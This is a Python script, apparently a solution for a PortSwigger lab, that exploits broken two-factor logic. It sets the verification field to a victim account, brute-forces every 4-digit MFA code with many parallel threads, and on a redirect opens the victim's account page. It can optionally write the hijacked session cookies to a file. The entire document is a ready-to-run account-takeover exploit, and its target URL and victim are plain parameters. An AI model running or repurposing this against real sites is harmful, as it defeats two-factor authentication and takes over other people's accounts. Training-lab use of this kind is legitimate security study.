#!/usr/bin/env python3
"""
2FA broken logic — brute force mfa-code then auto-login (PortSwigger lab).

Usage:
  python3 2fa-broken-logic.py \
    --url https://<id>.web-security-academy.net/login2 \
    --cookie "session=...; verify=carlos" \
    --victim carlos --workers 20 [--open]

On hit: prints the 302, then GET /my-account?id=<victim> with the same session
(that request is the auto-login / lab solve step).
"""
from __future__ import annotations

import argparse
import sys
import threading
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

try:
    import requests
    from requests import RequestException
except ImportError:
    print('error: pip3 install requests', file=sys.stderr)
    sys.exit(2)


def main() -> int:
    ap = argparse.ArgumentParser(description='2FA broken logic: brute force mfa-code + auto-login.')
    ap.add_argument('--url', required=True, help='https://<id>.web-security-academy.net/login2')
    ap.add_argument('--cookie', required=True, help='session=...; verify=carlos')
    ap.add_argument('--victim', default='carlos')
    ap.add_argument('--workers', type=int, default=20)
    ap.add_argument('--width', type=int, default=4)
    ap.add_argument('--timeout', type=float, default=20.0)
    ap.add_argument('--open', action='store_true', help='open browser on success')
    ap.add_argument('--cookie-out', default='', help='write session cookies as JSON here')
    args = ap.parse_args()

    p = urlparse(args.url)
    base = f'{p.scheme}://{p.netloc}'

    sess = requests.Session()
    sess.headers.update({
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:153.0) Gecko/20100101 Firefox/153.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Origin': base,
        'Referer': args.url,
    })
    # load the cookie into the jar (NOT the header) so Set-Cookie after login is honoured
    for part in args.cookie.split(';'):
        if '=' in part:
            k, v = part.split('=', 1)
            sess.cookies.set(k.strip(), v.strip())

    codes = [str(i).zfill(args.width) for i in range(10 ** args.width)]
    print(f'[*] target : {args.url}', flush=True)
    print(f'[*] verify : {args.victim}   codes: {len(codes)}   workers: {args.workers}', flush=True)

    lock = threading.Lock()
    state = {'stop': False, 'hit': None}

    def try_code(code):
        with lock:
            if state['stop']:
                return
        try:
            r = sess.post(args.url,
                          data={'verify': args.victim, 'mfa-code': code},
                          timeout=args.timeout, allow_redirects=False)
        except RequestException:
            return
        if r.status_code in (301, 302, 303, 307, 308):
            with lock:
                if state['stop']:
                    return
                state['stop'] = True
                state['hit'] = (code, r.status_code, r.headers.get('Location', ''))
            print(f'[+] HIT mfa-code={code}  status={r.status_code}  -> {r.headers.get("Location","")}', flush=True)
        return

    with ThreadPoolExecutor(max_workers=args.workers) as ex:
        list(ex.map(try_code, codes))

    if not state['hit']:
        print('[-] code not found', flush=True)
        return 1

    code, status, loc = state['hit']
    # auto-login / solve: open the account page with the same session
    acct = sess.get(f'{base}/my-account?id={args.victim}', timeout=args.timeout)
    ok = 'Your username is' in acct.text
    print(f'[*] GET /my-account?id={args.victim} -> {acct.status_code}  logged_in={ok}', flush=True)
    home = sess.get(base + '/', timeout=args.timeout)
    solved = 'Congratulations, you solved the lab' in home.text
    print(f'[*] solved={solved}', flush=True)

    if args.open:
        import webbrowser
        webbrowser.open(f'{base}/my-account?id={args.victim}')

    if args.cookie_out:
        import json
        jar = [{'name': c.name, 'value': c.value, 'domain': c.domain, 'path': c.path}
               for c in sess.cookies]
        Path(args.cookie_out).write_text(json.dumps(jar, indent=1), encoding='utf-8')
        print(f'[*] cookies -> {args.cookie_out}', flush=True)

    print(f'\nRESULT victim={args.victim} mfa-code={code} status={status} solved={solved}', flush=True)
    return 0


if __name__ == '__main__':
    sys.exit(main())